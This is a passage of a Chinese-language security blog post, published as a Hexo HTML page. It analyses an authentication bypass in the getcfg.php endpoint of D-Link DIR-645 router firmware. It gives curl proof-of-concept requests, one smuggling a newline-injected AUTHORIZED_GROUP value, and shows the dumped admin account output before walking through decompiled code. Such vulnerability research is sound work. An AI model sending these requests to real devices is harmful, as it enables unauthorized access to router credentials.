@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"voxzz.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="D-Link DIR-645 A1 1.06B01 getcfg.php 信息泄露漏洞分析。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="D-Link DIR-645 A1 1.06B01 getcfg.php 信息泄露漏洞分析">
+<meta property="og:url" content="https://voxzz.github.io/cybersecurity/vulnresearch/d-link-dir-645-a1-1-06B01-getcfg-php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="VBlog">
+<meta property="og:description" content="D-Link DIR-645 A1 1.06B01 getcfg.php 信息泄露漏洞分析。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-02-03T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-02-04T08:57:16.171Z">
+<meta property="article:author" content="Voxzz">
+<meta property="article:tag" content="D-Link">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://voxzz.github.io/cybersecurity/vulnresearch/d-link-dir-645-a1-1-06B01-getcfg-php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://voxzz.github.io/cybersecurity/vulnresearch/d-link-dir-645-a1-1-06B01-getcfg-php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","path":"cybersecurity/vulnresearch/d-link-dir-645-a1-1-06B01-getcfg-php-信息泄露漏洞分析/","title":"D-Link DIR-645 A1 1.06B01 getcfg.php 信息泄露漏洞分析"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>D-Link DIR-645 A1 1.06B01 getcfg.php 信息泄露漏洞分析 | VBlog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">VBlog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">漏洞信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">5.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Voxzz"
+      src="/images/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">Voxzz</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/voxzz" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;voxzz" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:voxzz0@163.com" title="E-Mail → mailto:voxzz0@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://b1ack1e.github.io/" title="https:&#x2F;&#x2F;b1ack1e.github.io" rel="noopener" target="_blank">b1ackie</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://voxzz.github.io/cybersecurity/vulnresearch/d-link-dir-645-a1-1-06B01-getcfg-php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="Voxzz">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="VBlog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="D-Link DIR-645 A1 1.06B01 getcfg.php 信息泄露漏洞分析 | VBlog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          D-Link DIR-645 A1 1.06B01 getcfg.php 信息泄露漏洞分析
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-02-04 00:00:00 / 修改时间：16:57:16" itemprop="dateCreated datePublished" datetime="2026-02-04T00:00:00+08:00">2026-02-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">漏洞研究</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>D-Link DIR-645 A1 1.06B01 getcfg.php 信息泄露漏洞分析。</p>
+<span id="more"></span>
+
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞编号：无</p>
+<p>漏洞类型：权限绕过</p>
+<p>漏洞组件：&#x2F;htdocs&#x2F;web&#x2F;getcfg.php</p>
+<p>影响范围：</p>
+<ul>
+<li>D-Link DIR-645 &lt;&#x3D; A1 1.06B01</li>
+</ul>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>基于 D-Link DIR-645 A1 1.03B11 版本进行漏洞复现。</p>
+<p>对于 1.02 及之前版本固件的 PoC 如下。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d SERVICES=DEVICE.ACCOUNT http://xx.xx.xx.xx/getcfg.php</span><br></pre></td></tr></table></figure>
+
+<p>对于 1.02 之后版本固件的 PoC 如下。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d &quot;SERVICES=DEVICE.ACCOUNT&amp;attack=ture%0aAUTHORIZED_GROUP=1&quot; &quot;http://xx.xx.xx.xx/getcfg.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>运行 PoC 命令，得到设备用户的用户名和密码。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -d <span class="string">&quot;SERVICES=DEVICE.ACCOUNT&amp;attack=ture%0aAUTHORIZED_GROUP=1&quot;</span> <span class="string">&quot;http://192.168.0.1/getcfg.php&quot;</span></span></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;postxml&gt;</span><br><span class="line">&lt;module&gt;</span><br><span class="line">	&lt;service&gt;DEVICE.ACCOUNT&lt;/service&gt;</span><br><span class="line">	&lt;device&gt;</span><br><span class="line">		&lt;gw_name&gt;DIR-645&lt;/gw_name&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;account&gt;</span><br><span class="line">			&lt;seqno&gt;&lt;/seqno&gt;</span><br><span class="line">			&lt;max&gt;2&lt;/max&gt;</span><br><span class="line">			&lt;count&gt;1&lt;/count&gt;</span><br><span class="line">			&lt;entry&gt;</span><br><span class="line">				&lt;uid&gt;&lt;/uid&gt;</span><br><span class="line">				&lt;name&gt;Admin&lt;/name&gt;</span><br><span class="line">				&lt;usrid&gt;&lt;/usrid&gt;</span><br><span class="line">				&lt;password&gt;&lt;/password&gt;</span><br><span class="line">				&lt;group&gt;0&lt;/group&gt;</span><br><span class="line">				&lt;description&gt;&lt;/description&gt;</span><br><span class="line">			&lt;/entry&gt;</span><br><span class="line">		&lt;/account&gt;</span><br><span class="line">		&lt;group&gt;</span><br><span class="line">			&lt;seqno&gt;&lt;/seqno&gt;</span><br><span class="line">			&lt;max&gt;&lt;/max&gt;</span><br><span class="line">			&lt;count&gt;0&lt;/count&gt;</span><br><span class="line">		&lt;/group&gt;</span><br><span class="line">		&lt;session&gt;</span><br><span class="line">			&lt;captcha&gt;0&lt;/captcha&gt;</span><br><span class="line">			&lt;dummy&gt;&lt;/dummy&gt;</span><br><span class="line">			&lt;timeout&gt;600&lt;/timeout&gt;</span><br><span class="line">			&lt;maxsession&gt;128&lt;/maxsession&gt;</span><br><span class="line">			&lt;maxauthorized&gt;16&lt;/maxauthorized&gt;</span><br><span class="line">		&lt;/session&gt;</span><br><span class="line">	&lt;/device&gt;</span><br><span class="line">&lt;/module&gt;</span><br><span class="line">&lt;/postxml&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据漏洞路由，查看 <code>/htdocs/web/getcfg.php</code> 页面的主要代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&quot;CACHE&quot;</span>] == <span class="string">&quot;true&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">dump</span>(<span class="number">1</span>, <span class="string">&quot;/runtime/session/&quot;</span>.<span class="variable">$SESSION_UID</span>.<span class="string">&quot;/postxml&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">is_power_user</span>() == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* cut_count() will return 0 when no or only one token. */</span></span><br><span class="line">		<span class="variable">$SERVICE_COUNT</span> = <span class="title function_ invoke__">cut_count</span>(<span class="variable">$_POST</span>[<span class="string">&quot;SERVICES&quot;</span>], <span class="string">&quot;,&quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">TRACE_debug</span>(<span class="string">&quot;GETCFG: got &quot;</span>.<span class="variable">$SERVICE_COUNT</span>.<span class="string">&quot; service(s): &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;SERVICES&quot;</span>]);</span><br><span class="line">		<span class="variable">$SERVICE_INDEX</span> = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (<span class="variable">$SERVICE_INDEX</span> &lt; <span class="variable">$SERVICE_COUNT</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$GETCFG_SVC</span> = <span class="title function_ invoke__">cut</span>(<span class="variable">$_POST</span>[<span class="string">&quot;SERVICES&quot;</span>], <span class="variable">$SERVICE_INDEX</span>, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">			<span class="title function_ invoke__">TRACE_debug</span>(<span class="string">&quot;GETCFG: serivce[&quot;</span>.<span class="variable">$SERVICE_INDEX</span>.<span class="string">&quot;] = &quot;</span>.<span class="variable">$GETCFG_SVC</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$GETCFG_SVC</span>!=<span class="string">&quot;&quot;</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$file</span> = <span class="string">&quot;/htdocs/webinc/getcfg/&quot;</span>.<span class="variable">$GETCFG_SVC</span>.<span class="string">&quot;.xml.php&quot;</span>;</span><br><span class="line">				<span class="comment">/* GETCFG_SVC will be passed to the child process. */</span></span><br><span class="line">				<span class="keyword">if</span> (<span class="title function_ invoke__">isfile</span>(<span class="variable">$file</span>)==<span class="string">&quot;1&quot;</span>) <span class="title function_ invoke__">dophp</span>(<span class="string">&quot;load&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$SERVICE_INDEX</span>++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* not a power user, return error message */</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;\t&lt;result&gt;FAILED&lt;/result&gt;\n&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;\t&lt;message&gt;Not authorized&lt;/message&gt;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>&lt;/postxml&gt;</span><br></pre></td></tr></table></figure>
+
+<p>页面调用 <code>is_power_user()</code> 函数对当前请求的权限进行验证，通过后根据 <code>SERVICES</code> 参数的值读取 <code>/htdocs/webinc/getcfg/</code> 目录下的文件内容。</p>
+<p>在 <code>/htdocs/webinc/getcfg/</code> 目录下有许多配置文件，其中 <code>DEVICE.ACCOUNT.xml.php</code> 可以读取到设备的账号信息。</p>
+<p>分析 <code>is_power_user()</code> 可知，当 <code>AUTHORIZED_GROUP</code> 全局变量的值是为空或者为 “0” 时，表示验证失败，否则表示验证成功。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_power_user</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_GLOBALS</span>[<span class="string">&quot;AUTHORIZED_GROUP&quot;</span>] == <span class="string">&quot;&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_GLOBALS</span>[<span class="string">&quot;AUTHORIZED_GROUP&quot;</span>] &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>经过全局字符串搜索，猜测全局变量由负责 php 文件请求的 <code>/usr/sbin/phpcgi</code> 文件进行处理。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -l usr/sbin/phpcgi</span> </span><br><span class="line">lrwxrwxrwx 1 person person 14 Oct 22 01:47 usr/sbin/phpcgi -&gt; /htdocs/cgibin</span><br></pre></td></tr></table></figure>
+
+<p>查看 cgibin 文件的 <code>main</code> 函数可知，phpcgi 文件由 <code>phpcgi_main</code> 函数负责处理。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">&quot;phpcgi&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = phpcgi_main;</span><br><span class="line">  v9 = argc;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="type">int</span> (__fastcall *)(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">char</span> **))v8)(v9, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>phpcgi_main</code> 函数中，根据请求方式的不同，将选择不同的解析函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  req_method = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line">  req_method_1 = req_method;</span><br><span class="line">  <span class="keyword">if</span> ( !req_method )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  <span class="keyword">if</span> ( !strcasecmp(req_method, <span class="string">&quot;HEAD&quot;</span>) || !strcasecmp(req_method_1, <span class="string">&quot;GET&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    parser = t_get_parser;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( strcasecmp(req_method_1, <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_20:</span><br><span class="line">    v5 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">  parser = t_post_parser;</span><br></pre></td></tr></table></figure>
+
+<p>程序调用 <code>cgibin_parse_request</code> 函数对 POST 请求的内容进行解析，然后将解析后的参数交给 PHP 页面进行处理。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">v5 = cgibin_parse_request(parser, req_args_1, <span class="number">0x80000</span>);</span><br><span class="line"><span class="keyword">if</span> ( v5 &gt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v13 = sess_validate();</span><br><span class="line">  <span class="built_in">sprintf</span>(auth_group, <span class="string">&quot;AUTHORIZED_GROUP=%d&quot;</span>, v13);</span><br><span class="line">  sobj_add_string(req_args_1, auth_group);</span><br><span class="line">  sobj_add_char(req_args_1, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  sobj_add_string(req_args_1, <span class="string">&quot;SESSION_UID=&quot;</span>);</span><br><span class="line">  sess_get_uid(req_args_1);</span><br><span class="line">  sobj_add_char(req_args_1, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="built_in">string</span> = sobj_get_string(req_args_1);</span><br><span class="line">  v5 = xmldbc_ephp(<span class="number">0</span>, <span class="number">0</span>, <span class="built_in">string</span>, <span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v5 == <span class="number">-100</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v12 = fopen(<span class="string">&quot;/htdocs/web/info.php&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    fclose(v12);</span><br><span class="line">    cgibin_print_http_resp(<span class="number">1</span>, <span class="string">&quot;/info.php&quot;</span>, <span class="string">&quot;FAIL&quot;</span>, <span class="string">&quot;ERR_REQ_TOO_LONG&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  cgibin_print_http_status(<span class="number">400</span>, <span class="string">&quot;unsupported HTTP request&quot;</span>, <span class="string">&quot;unsupported HTTP request&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当 POST 请求解析完成，程序将根据 Session 的有效性，设置 <code>AUTHORIZED_GROUP</code> 和 <code>SESSION_UID</code> 参数的值。</p>
